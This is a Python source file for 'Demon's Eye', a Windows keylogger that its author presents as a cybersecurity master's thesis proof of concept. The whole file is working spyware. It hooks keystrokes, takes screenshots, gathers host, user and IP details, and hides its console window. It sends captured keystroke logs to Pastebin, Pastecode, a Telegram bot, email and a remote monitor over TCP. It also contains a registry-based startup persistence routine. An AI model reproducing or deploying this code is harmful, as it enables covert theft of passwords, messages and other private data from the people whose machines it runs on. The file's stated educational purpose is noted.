#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
#    ____                             _       _____             _  __          _
#   |  _ \  ___ _ __ ___   ___  _ __ ( )___  | ____|   _  ___  | |/ /___ _   _| | ___   __ _  __ _  ___ _ __
#   | | | |/ _ \ '_ ` _ \ / _ \| '_ \|// __| |  _|| | | |/ _ \ | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
#   | |_| |  __/ | | | | | (_) | | | | \__ \ | |__| |_| |  __/ | . \  __/ |_| | | (_) | (_| | (_| |  __/ |
#   |____/ \___|_| |_| |_|\___/|_| |_| |___/ |_____\__, |\___| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
#                                                  |___/                 |___/         |___/ |___/
# -----------------------------------------------------------------------------------------------------------
# Name:             demonseye.py
# Purpose:          ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
#                   EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
#
# Author:           Gabriel Marti Fuentes
# email:            gabimarti at gmail dot com
# GitHub:           https://github.com/gabimarti
# Created:          19/05/2019
# License:          GPLv3
# First Release:
# Version:          0.0.1
#
# Features:         * Record keystrokes
#                   * Periodic screen capture
#                   * Send data to a remote computer with Monitor App (to do)
#                   * Send data to an email account (to do)
#                   * Send data to a Twitter account (to do)
#                   * Paste data to a Paste service/site (to do)
#
# Required:         Install with "pip install module-name-required"
#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, python-telegram-bot
#                   This list could be incomplete.
#                   Install the necessary modules that are requested when executing the program.
#
# Binary Gen:       To create the executable in Windows, PyInstaller has been used.
#                   Executable compression is disabled and the creation of a single file is forced.
#                   pyinstaller --noupx -F demonseye.py
#
# Notes:            This code has been tested, developed and designed to work in a Windows environment.
#                   Its purpose is only educational.
#
# Updates:
#
# -----------------------------------------------------------------------------------------------------------
#
#   Reminder for future features to do:
#           - auto clone app / copy to windows tmp
#           - install in win registry
#           - send info to paste service
#           - send info to twitter
#           - hide app
#           - command line params: install registry, hide, etc.
#           - system disk info
#           - memory info
#           - server witch sockets connection
# -----------------------------------------------------------------------------------------------------------

import config_gm as config
import argparse
import atexit
import base64
import datetime
import getpass
import glob
import logging
import os
import platform
from smtplib import SMTP
import pythoncom
import pyWinhook as pyHook
import smtplib
import socket
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
import win32console
import win32gui
import winreg
import wx

########################################################
# CONSTANTS
########################################################
APPNAME = 'Demon\'s Eye Keylogger'      # Simply a name
VERSION = '0.0.1'                       # Version
LOGGING_LEVEL = logging.DEBUG           # Log level. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
LOG_FILENAME = 'DEKlogger.log'          # File name for the Log Level registered data (not keystrokes logging)
CRLF = '\n'                             # Line Feed
KLGPRE = 'klg_'                         # Keylogger file name prefix (keystrokes logging)
KLGEXT = '.dek'                         # Keylogger file extension
SCRPRE = 'scr_'                         # Screenshot file name prefix
SCREXT = '.png'                         # Screenshot file extension
KEYCODE_EXIT = 7                        # CTRL + G : special combination to close / deactivate keylogger
KEYSTOSCREENSHOT = 50                   # Screenshots every x Keystrokes

# Server constants
SERVER_IP = ''
SERVER_PORT = 6666
SERVER_BUFFER_SIZE = 2048
SERVER_MAX_CLIENTS = 5
SERVER_ACCEPT_TIMEOUT = 0.1
# Message received to identify the Monitor.
MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
DEMONS_EYE_ID = 'D3Y3K3YL0G'            # Identifier for the monitor to recognize the keylogger
DEFAULT_MONITOR_PORT = 7777             # Monitor port where to send data
MONITOR_SOCKET_TIMEOUT = 3              # Timeout socket connection
MAGIC_RESPONSE = DEMONS_EYE_ID + ' ' + APPNAME + ' ' + VERSION
ENCODING = 'utf-8'


########################################################
# GLOBAL VARIABLES
########################################################

# key counter
key_counter = 0

# Previous event control. Used to detect when the user changes the window or application.
old_event = None

# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk are
# avoided for each key pressed. When the key_max_chars limit is exceeded the buffer is written to disk.
key_max_chars = 25
key_buffer = ''

# File size control (in bytes) that activates to be sent to remote storage. When the size of the keylog file exceeds
# this size, then the file is sent, then it is deleted and a new keylog file is created.
file_size_trigger = 1024

# Path and file name of keylogger data file. The name is assigned in the create_keylog_file() function.
# Also use the constants KLGPRE and KLGEXT
keylog_name = ''

# Threads control
threadLock = threading.Lock()
threadList = []

# TCP Server control
server_has_client = False  # Client connected ?
client_thread = None  # This is a thread object of Client
server = None  # Server object instance

# Send to Monitor control variables
monitor_soc = None                              # Socket that controls communication to monitor
monitor_enable_send = False                     # Enabled? It could be avoided by checking only if the socket exists.
monitor_ip = None                               # Destination IP
monitor_port = DEFAULT_MONITOR_PORT             # Destination PORT

# Global Mouse and Keyboard Hook
hm = None


########################################################
# CLASSES
########################################################

# Threading class to capture screenshot and send to remote services
class ScreenShootThread(threading.Thread):
    def __init__(self, screen_filename):
        threading.Thread.__init__(self)
        self.screen_file = screen_filename

    def run(self):
        logging.debug('Guardado captura {}'.format(self.screen_file))
        app = wx.App()  # Need to create an App instance before doing anything
        screen = wx.ScreenDC()
        size_x, size_y = screen.GetSize()
        bmp = wx.EmptyBitmap(size_x, size_y, -1)
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
        del mem  # libera memoria que contiene captura de imagen
        del app  # libera objeto de instancia de la aplicación
        bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
        logging.debug('Fin captura {}'.format(self.screen_file))
        # Send screenshot to remote servers
        # ... pending ...


# Threading class to listen Monitor petitions and create client parameters for response and send data to monitor.
class ClientThread(threading.Thread):
    def __init__(self, conn, ip, port):
        threading.Thread.__init__(self)
        self.conn = conn
        self.ip = ip
        self.port = port
        self.response = base64.b64encode(bytes(MAGIC_RESPONSE, ENCODING))

    def run(self):
        global monitor_ip, monitor_port, monitor_enable_send

        logging.info('Recibida petición de Monitor desde {}:{}'.format(self.ip,self.port))

        # Process data / message
        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()
        logging.debug('Se ha recibido: {}'.format(data))

        if data == MAGIC_MESSAGE:
            logging.debug('Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE, self.response))
            self.conn.sendall(self.response)
            logging.debug('Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port))
            # Set data for reverse communication to the Monitor
            monitor_ip = self.ip
            monitor_enable_send = True
        else:
            msg = 'No tiene permiso.'
            monitor_enable_send = False
            monitor_ip = None
            self.conn.sendall(msg).encode(ENCODING)
            logging.debug('Respondiendo {}',format(msg))

        self.conn.close()


class ServerListenerThread(threading.Thread):
    def __init__(self, ip=SERVER_IP, port=SERVER_PORT, buffer_size=SERVER_BUFFER_SIZE):
        threading.Thread.__init__(self)
        self.name = APPNAME
        self.ip = ip
        self.port = port
        self.buffer_size = buffer_size
        self.client_threads = []
        self.server_socket = None
        self.server_shutdown = False  # When the server is killed it is set to True

    def stop_server(self):
        self.server_shutdown = True

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.ip, self.port))
        msg = APPNAME + ' ' + VERSION + ' : Iniciado servidor en ' + str(self.ip) + ' puerto ' + str(self.port)
        logging.info(msg)

        self.server_socket.settimeout(SERVER_ACCEPT_TIMEOUT)
        self.server_socket.listen(SERVER_MAX_CLIENTS)  # 5 clients are more than enough.

        while not self.server_shutdown:
            try:
                (conn, (ip, port)) = self.server_socket.accept()
            except socket.timeout:
                pass  # ignore timeout, next accept
            except Exception as e:
                logging.error('Error recibiendo datos de cliente. Excepcion {} '.format(e))
                break  # Possibly closed server
            else:
                # Inicia thread de respuesta - Starts client response thread
                client = ClientThread(conn, ip, port)
                client.start()
                self.client_threads.append(client)

        # Make sure the server is turned off.
        try:
            logging.info('Shutting Down Server')
            self.server_socket.shutdown(socket.SHUT_RDWR)
            self.server_socket.close()
        except Exception as e:
            logging.error('Server already closed. Exception {}'.format(e))


########################################################
# FUNCTIONS
########################################################

# Send data to monitor (realtime typing sending)
def monitor_data_send(data_to_send):
    global monitor_soc, monitor_ip, monitor_port, monitor_enable_send, keylog_name
    # Can send?
    if monitor_enable_send and monitor_ip is not None and monitor_port is not None and os.path.getsize(keylog_name) >= file_size_trigger:
        try:
            # Open connection to monitor if not connection exists
            if not monitor_soc:
                monitor_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                monitor_soc.settimeout(MONITOR_SOCKET_TIMEOUT)
                monitor_soc.connect((monitor_ip, monitor_port))
                logging.debug('Created new Socket')

            # Send Data
            data_to_send = bytes(data_to_send, ENCODING)
            monitor_soc.sendall(data_to_send)                          # monitor_soc.sendall(data_to_send)
            logging.debug('Sended :{}'.format(data_to_send))
            '''
            file = open(keylog_name, 'rb')
            bloc = file.read(SERVER_BUFFER_SIZE)
            while bloc:
                soc.sendall(bloc).encode(ENCODING)
                bloc = file.read(SERVER_BUFFER_SIZE)
            file.close()
            '''
        except Exception as ex:
            logging.error('Error sending data to Monitor to {}:{}. Exception : {}'.format(monitor_ip, monitor_port, ex))
        finally:
            '''
            if file:
                file.close()
            '''
    else:
        # Close connection if not enabled Send
        if monitor_soc:
            try:
                monitor_soc.close()
            except:
                pass


# Kill Server and associated clients
def kill_server_clients():
    global server

    if server is not None:
        try:
            server.stop_server()
        except Exception as e:
            logging.error('Error Stopping Server. Exception {}'.format(e))

        # Kill clients
        for client in server.client_threads:
            try:
                client.close()
            except Exception as e:
                logging.error('Error Killing client. Exception {}'.format(e))

        # Kill Server
        try:
            logging.info('Shutdown server')
            # server.server_socket.shutdown(socket.SHUT_RDWR)
            server.server_socket.close()
        except Exception as e:
            logging.error('Server already closed. Exception {}'.format(e))

        server = None


# Load a content of keylogger file into a string variable
def load_file(file_name):
    logging.debug('Loading file {} '.format(file_name))
    with open(file_name, 'r') as f:
        data = f.read().strip()
    return data


# Sends keylogger file to a paste service
# : file_name = full path of file to send
# : service = 1 => Pastebin      https://pastebin.com/api        example: https://pastebin.com/tW4Z2KXG
# : service = 2 => Pastecode     https://pastecode.xyz/api       example: https://pastecode.xyz/view/722cfc48
# : service = 3 => Telegram Bot  https://core.telegram.org/bots/api
def paste_file(file_name, service):
    paste_service_url = ""
    paste_params = {}
    url_file_pasted = ""
    if service == config.PASTE_PASTEBIN and config.PASTEBIN_ENABLED:        # Pastebin
        paste_service_url = config.PASTEBIN_POST_URL                        # Post url
        # Create parameters structure
        paste_params = {'api_dev_key': str(config.PASTEBIN_API_DEV_KEY),    # Our dev key (see config.py)
                        'api_option': str(config.PASTEBIN_OPTION),
                        'api_paste_code': str(load_file(file_name)),
                        'api_paste_name': str(APPNAME + ' ' + file_name),
                        'api_paste_format': str(config.PASTEBIN_FORMAT),
                        'api_paste_private': int(config.PASTEBIN_PRIVATE),
                        'api_paste_expire_date': str(config.PASTEBIN_POST_EXPIRE)
                        }
        # If not set user and pass an anonymous paste is made
        if config.PASTEBIN_USER_NAME is not "":
            paste_params['api_user_name'] = str(config.PASTEBIN_USER_NAME)
            paste_params['api_user_password'] = str(config.PASTEBIN_PASSWORD)

        logging.info('Pastebin envia: {}'.format(paste_params))
    elif service == config.PASTE_PASTECODE and config.PASTECODE_ENABLED:    # Pastecode
        paste_service_url = config.PASTECODE_POST_URL                       # Post url
        # Create parameters structure
        paste_params = {'text': str(load_file(file_name)),
                        'title': str(file_name),
                        'name': str(APPNAME),
                        'private': config.PASTECODE_PRIVATE,                # 1 = private
                        'language': config.PASTECODE_POST_FORMAT,
                        'expire': config.PASTECODE_POST_EXPIRE
                        }
        logging.info('Pastecode envia: {}'.format(paste_params))
    elif service == config.PASTE_TELEGRAM and config.TELEGRAM_BOT_ENABLED:  # Telegram Bot
        paste_params = {}
        paste_service_url = config.TELEGRAM_BOT_POST_URL + '&text=str(load_file(file_name)'
        logging.info('Telegram Bot envia: {}'.format(paste_service_url))
    else:
        logging.debug('No esta activado ningun servicio de Paste')

    if paste_service_url is not "":
        # Encode data
        data_encoded = urllib.parse.urlencode(paste_params)
        data_encoded = data_encoded.encode(ENCODING)
        logging.debug('Parametros codificados {}'.format(data_encoded))

        # HTTP post request
        req = urllib.request.urlopen(paste_service_url, data_encoded)

        # Get url of file pasted from API response
        url_file_pasted = req.read().decode(ENCODING)
        logging.debug('URL of Paste {}'.format(url_file_pasted))

    return url_file_pasted


# Add the file to the startup registry key
def add_keylogger_to_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    fileName = sys.argv[0].split('\\')[-1]
    newFilePath = fp + '\\' + fileName
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2Change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    winreg.SetValueEx(key2Change, 'DEK', 0, REG_SZ, newFilePath)
    # TODO: Not tested


# Mail info send
def send_email(message):
    if not config.SEND_EMAIL_ENABLED:
        return

    try:
        # Configuration data
        email_from_addr = config.SEND_EMAIL_FROM
        email_to_addrs = config.SEND_EMAIL_DESTINATION_ADDRS
        email_username = config.SEND_EMAIL_USERNAME
        email_password = config.SEND_EMAIL_PASSWORD

        # Sending mail
        smtp_server = config.SEND_EMAIL_SMTP + ':' + config.SEND_EMAIL_PORT
        server_mail: SMTP = smtplib.SMTP(smtp_server)
        if config.SEND_EMAIL_TLS:
            server_mail.starttls()
        server_mail.login(email_username, email_password)
        server_mail.sendmail(email_from_addr, email_to_addrs, message)

    except Exception as ex:
        logging.error('No he podido enviar mensaje. Excepcion : {}'.format(ex))

    finally:
        server_mail.quit()


# Hide the application window
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    logging.debug('Oculta consola')


# Get the external ip
def get_external_ip():
    service_url = 'https://ident.me'
    external_ip = urllib.request.urlopen(service_url).read().decode(ENCODING)
    logging.info('IP Wan {} '.format(external_ip))
    return external_ip


# Add initial system information to the keylog file
def register_system_info():
    global key_buffer

    key_buffer += '[SYSTEM INFO BEGIN]' + CRLF
    key_buffer += 'cpu=' + cpu + CRLF
    key_buffer += 'os=' + operating_system + CRLF
    key_buffer += 'hostname=' + hostname + CRLF
    key_buffer += 'username=' + username + CRLF
    key_buffer += 'localip=' + localip + CRLF
    key_buffer += 'externalip=' + externalip + CRLF
    key_buffer += 'executable=' + execname + CRLF
    key_buffer += 'extension=' + extension + CRLF
    key_buffer += 'drive=' + driveunit + CRLF
    key_buffer += 'selfpathandfilename=' + keylog_name + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
    key_buffer += '[SYSTEM INFO END]' + CRLF + CRLF


# Save the name of the active window and add it to the keylog file
def register_window_name(text):
    global key_buffer
    key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
    logging.debug('Window Name : {}'.format(text))


# Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
# it to the external service.
def capture_screen():
    global key_buffer, threadList, args
    if not args.noscreenshot:
        tmp_folder = tempfile.gettempdir() + '\\'
        screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M%S") + SCREXT
        key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
        pantalla = ScreenShootThread(screen_file)
        threadList.append(pantalla)
        pantalla.start()
    else:
        logging.debug('Screenshot disabled. No capturing')


# Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
def send_keylog_file(keylog_name):
    '''
    Aqui envia el fichero al servidor  o servicios configurados
    Hacer un 'paste' en un servidor
    Publicar un tweet en cuenta privada con la url del paste
    Opcionalmente hace envio por email para pruebas
    '''
    # Servicio Pastebin
    logging.debug('Sending to Pastebin...')
    url_paste = paste_file(keylog_name, config.PASTE_PASTEBIN)
    logging.info('Pastebin url : {}'.format(url_paste))

    logging.debug('Sending to Pastecode...')
    url_paste = paste_file(keylog_name, config.PASTE_PASTECODE)
    logging.info('Pastecode url : {}'.format(url_paste))

    logging.debug('Sending to Telegram...')
    url_paste = paste_file(keylog_name, config.PASTE_TELEGRAM)
    logging.info('Pastecode url : {}'.format(url_paste))

    # Envia a Monitor
    # monitor_data_send()
    # El envio a al monitor se hace en tiempo real y es llamado cada vez que se almacena un caracter.

    # Envia a Twitter
    pass
    return True


# Delete all temporary keylog files.
# A pattern and a message can be set and reused to erase the screenshot files.
def delete_keylog_tempfile(pattern=None, logmsg='Borrado fichero temporal'):
    if pattern is None:  # Si no se recibe patron, por defecto borra todos los ficheros de keylog
        pattern = KLGPRE + '*' + KLGEXT  # If no pattern is received, by default it deletes all keylog files

    count = 0
    folder_files = tempfile.gettempdir() + '\\' + pattern
    for file_remove in glob.glob(folder_files):
        logging.info('{} : {}'.format(logmsg, file_remove))
        try:
            os.remove(file_remove)              # Try to remove file
            count += 1
        except Exception as e:
            logging.error('Error borrando archivo {}. Excepcion: {}'.format(file_remove, e))

    return count  # Return number of deleted files (if needed)


# Create empty keylog file
def create_keylog_file():
    global keylog_name, key_buffer

    # Create keylog file in the user's temporary folder
    prefix = KLGPRE + datetime.datetime.now().strftime('%y%m%d%H%M')
    ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
    logging.debug('Create keylogger file {}'.format(keylog_name))
    f = open(keylog_name, 'w+')
    f.close()

    key_buffer = ''             # Empty buffer
    register_system_info()      # Save system info
    return True


# Empty the keyboard buffer over the disk file
def flush_key_buffer_to_disk():
    global key_buffer, keylog_name

    # Append to file
    f = open(keylog_name, 'a')
    f.write(key_buffer)
    f.close()

    key_buffer = ''
    return True


# Returns if a special key can be saved to the keylog
def save_special_control_key(event):
    switcher = {
        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': False, 'LCONTROL': True, 'RCONTROL': True,
        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True, 'BACK': True, 'DELETE': True,
        'HOME': True, 'END': True, 'PRIOR': True, 'NEXT': True, 'ESCAPE': True
    }
    return switcher.get(event.Key.upper(), True)


# Adds key to buffer
def add_key_to_buffer(event):
    global key_buffer, key_max_chars, key_counter, args
    key = event.Ascii

    # asigna tecla. si es una tecla especial asigna string definiendo tipo de tecla
    # si se desea mostrar el espacio como [SPACE] se debe de indicar (key < 33)
    # en la condicion inferior, sino se mostrara un espacio en blanco tal cual.
    if (key < 32) or (key > 126):
        if save_special_control_key(event):
            ckey = '[' + event.Key.upper() + ']'
            # Cada vez que se pulsa RETURN añade salto de linea y hace captura de pantalla
            # With each press of RETURN add the line break and take a screenshot.
            if ckey == '[RETURN]':
                ckey += CRLF
            key_buffer += ckey
        else:
            ckey = ''
    else:
        ckey = chr(key)
        key_buffer += ckey

    # inc key counter.
    if len(ckey) > 0:
        key_counter += 1
        # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
        if key_counter % args.keystoscreenshot == 0:
            capture_screen()

    # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
    if len(key_buffer) > key_max_chars:
        monitor_data_send(key_buffer)           # Sends data to monitor
        flush_key_buffer_to_disk()
        # if the file size has exceeded the limit
        if os.path.getsize(keylog_name) >= file_size_trigger:
            send_keylog_file(keylog_name)

    return True


# Mouse events control. No mouse events are recorded except window changes
def on_mouse_event(event):
    global old_event

    # si el usuario cambia de ventana, la registra
    '''
    if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
        register_window_name(repr(event.WindowName))

    old_event = event
    '''
    return True     # IMPORTANT. True must be returned


# Keyboard events control
def on_keyboard_event(event):
    global key_buffer, key_counter, old_event, server, hm
    close_app = False

    try:
        # Logging and verbose (for debug) of keystrokes and related info
        msg = 'Time: ' + repr(event.Time)
        logging.debug(msg)
        msg = 'MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
        logging.debug(msg)
        msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
        logging.debug(msg)
        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii))
        logging.debug(msg)
        msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
        logging.debug(msg)
        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended)
        logging.debug(msg)
        msg = 'Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt)
        logging.debug(msg)
        msg = 'Transition: ' + repr(event.Transition)
        logging.debug(msg)

        # If user change active window or is the first time, saves Window Name
        if old_event is None or event.WindowName != old_event.WindowName:
            old_event = event
            register_window_name(repr(event.WindowName))

        # If especial key to close keylogger is pressed
        if event.Ascii == KEYCODE_EXIT:
            logging.info('Cerrando aplicación por combinación especial de tecla {}'.format(repr(event.Ascii)))
            key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
            close_app = True

        # save key to buffer
        add_key_to_buffer(event)

        # Saves current event info to compare with next one.
        old_event = event
    except Exception as ex:
        print("Exception %s " % ex)

    # Exit control, Disables Hook
    if close_app:
        hm.UnhookKeyboard()
        hm.UnhookMouse()
        server.stop_server()
        # kill_server_clients()
        exit_program()

    return True     # IMPORTANT. True must be returned


# Actions to do before Exit program
def exit_program():
    global key_buffer, threadList, server, hm
    logging.debug('Entering exit_program')

    # do a last screenshot
    capture_screen()

    # saves to keylog file the Closing Event, Date and Time
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF

    # empty the key buffer to disk
    flush_key_buffer_to_disk()

    # send de last keylog capture file
    send_keylog_file()

    # wait to all threads are finished
    for thr in threadList:
        thr.join()

    # delete temp files
    deleted = delete_keylog_tempfile()
    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')

    logging.info('Cerrando')
    logging.shutdown()

    sys.exit(0)


# When program is closed
def on_close_program():
    global key_buffer, threadList, server, hm
    logging.debug('Entering on_close_program')

    # ejecuta ultima captura de pantalla antes de cerrar - do a last screenshot
    capture_screen()

    # registra en fichero de log el cerrado del programa con fecha y hora
    # saves to keylog file the Closing Event, Date and Time
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF

    # se asegura de vaciar buffer - empty the key buffer to disk
    flush_key_buffer_to_disk()

    # envia ultimo fichero de log de teclas - send de last keylog capture file
    send_keylog_file()

    # espera que finalicen todos los threads que pueda haber activos
    # wait to all threads are finished
    for thr in threadList:
        thr.join()

    # borra ficheros temporales - delete temp files
    deleted = delete_keylog_tempfile()
    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')

    logging.info('Cerrando')
    logging.shutdown()

    return True

'''
Control parametros linea de comando, para instalar, configurar, ajustar.
NO IMPLEMENTADO TODAVIA
'''

# Return Logging Level
def set_logging_level(verbose_level):
    switcher = {
        0:  sys.maxsize,                      # No logging, no print
        1:  logging.CRITICAL,
        2:  logging.ERROR,
        3:  logging.WARNING,
        4:  logging.INFO,
        5:  logging.DEBUG
    }
    return switcher.get(verbose_level, sys.maxsize)


# Parse command line parameters
def parse_params():
    parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
                                     epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
    parser.add_argument('-s', '--start', action='store_true', required=True,
                        help='Specify -s or --start to start Keylogger')
    parser.add_argument('-k', '--keystoscreenshot', type=int, default=KEYSTOSCREENSHOT,
                        help='Number of keystrokes to take a screenshot. Default value: {}'.format(KEYSTOSCREENSHOT))
    parser.add_argument('--noscreenshot', action='store_true', required=False, default=False,
                        help='Disable Screenshot capture')
    parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3, 4, 5], default=0,
                        help='Debug verbose to screen. Default value: 0')
    parser.add_argument('-f', '--logtofile', action='store_true', required=False, default=False,
                        help='If set, log messages are saved to {}. Default value: 0'.format(LOG_FILENAME))
    args_parsed = parser.parse_args()

    return args_parsed


########################################################
# MAIN
########################################################

args = parse_params()  # Check and parse parameters

# Sets logging settings
log_format = '%(asctime)s %(levelname)08s: L%(lineno)4s %(funcName)25s(): %(message)s'
log_date_fmt = '%d/%m/%Y %I:%M:%S %p'
log_handlers = [logging.StreamHandler()]  # Default Log handler console

if args.logtofile:
    log_handlers.append(logging.FileHandler(LOG_FILENAME))  # If set Log to File (-f)

logging.basicConfig(level=set_logging_level(args.verbose), format=log_format, datefmt=log_date_fmt,
                    handlers=log_handlers)

logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys'.
              format(args.verbose, args.logtofile, args.noscreenshot, args.keystoscreenshot))

# Init some useful variables
cpu = platform.processor()
operating_system = platform.platform()
hostname = socket.gethostname()
username = getpass.getuser()
localip = socket.gethostbyname(hostname)
externalip = get_external_ip()
execname = sys.argv[0]  # modo alternativo > execname = os.path.realpath(__file__)
extension = os.path.splitext(__file__)[1]
driveunit = os.path.splitdrive(__file__)[0]

# Ensures that keylogger starts at system startup
# add_keylogger_to_startup()

# Hide console Window
hide_console()

# Delete old keylog files if exists
delete_keylog_tempfile()

# Delete old screenshots
delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura de pantalla anterior')

# Create new keylog file
create_keylog_file()

# Creates new hook manager
# Info: https://www.cs.unc.edu/Research/assist/doc/pyhook/public/pyHook.HookManager.HookManager-class.html
hm = pyHook.HookManager()

# Register event callbacks
hm.MouseAllButtonsDown = on_mouse_event
hm.KeyDown = on_keyboard_event

# Sets hook for Mouse and Keyboard
hm.HookMouse()
hm.HookKeyboard()

# Create server that listens TCP petitions from Monitor
server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
server.start()
# threadList.append(server)

# Handler to do actions when application is closed
# atexit.register(on_close_program)

# Wait indefinitely
pythoncom.PumpMessages()
